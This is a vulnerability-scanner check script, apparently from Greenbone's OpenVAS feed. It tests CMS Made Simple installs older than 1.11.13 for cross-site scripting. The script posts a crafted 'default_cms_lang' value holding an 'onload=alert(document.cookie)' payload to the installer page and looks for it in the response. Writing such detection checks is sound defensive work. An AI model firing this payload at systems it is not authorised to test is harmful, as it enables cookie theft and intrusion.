# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cmsmadesimple:cms_made_simple";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804327");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2014-03-18 13:06:25 +0530 (Tue, 18 Mar 2014)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2014-0334", "CVE-2014-2092");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("CMS Made Simple < 1.11.13 Multiple XSS Vulnerabilities (Mar 2014) - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_cms_made_simple_http_detect.nasl");
  script_mandatory_keys("cmsmadesimple/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"CMS Made Simple is prone to multiple cross-site scripting (XSS)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is vulnerable or not.");

  script_tag(name:"insight", value:"Multiple flaws exist due to improper validation of user supplied
  input to 'editevent.php', 'pagedefaults.php', 'adminlog.php', 'myaccount.php', 'siteprefs.php',
  'addbookmark.php', 'index.php', 'editorFrame.php', 'addhtmlblob.php', 'addtemplate.php',
  'addcss.php' scripts.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML or script code, steal cookie-based authentication credentials and launch other
  attacks.");

  script_tag(name:"affected", value:"CMS Made Simple prior to version 1.11.13.");

  script_tag(name:"solution", value:"Update to version 1.11.13 or later.");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/526062");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65746");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65898");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125353/CMSMadeSimple-1.11.10-Cross-Site-Scripting.html");
  script_xref(name:"URL", value:"https://www.cmsmadesimple.org/2015/02/Announcing-CMS-Made-Simple-1-11-13-Security-Release");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!http_port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

url = dir + "/install/index.php";

cmsRes = http_get(item:url,port:http_port);
cmsRes = http_keepalive_send_recv(port:http_port, data:cmsRes, bodyonly:FALSE);
if(!cmsRes)
  exit(0);

cookie = eregmatch(pattern:"Set-Cookie: PHPSESSID=([a-z0-9]+)", string:cmsRes);

if(cookie)
{
  url = dir + "/install/index.php?sessiontest=1";
  postData = "default_cms_lang='%3e" +
             '"%3e%3cbody%2fonload%3dalert(document.cookie)%3e&submit=Submit';

  host = http_host_name(port:http_port);
  cmsReq = string("POST ",url," HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "Cookie: PHPSESSID=",cookie[1],"\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData),"\r\n",
               "\r\n",
               postData);
  cmsRes = http_keepalive_send_recv(port:http_port, data:cmsReq, bodyonly:FALSE);
  if(cmsRes =~ "^HTTP/1\.[01] 200" && "onload=alert(document.cookie)>" >< cmsRes &&
      ">CMS Made Simple" >< cmsRes)
  {
    security_message(port:http_port);
    exit(0);
  }
}

exit(0);
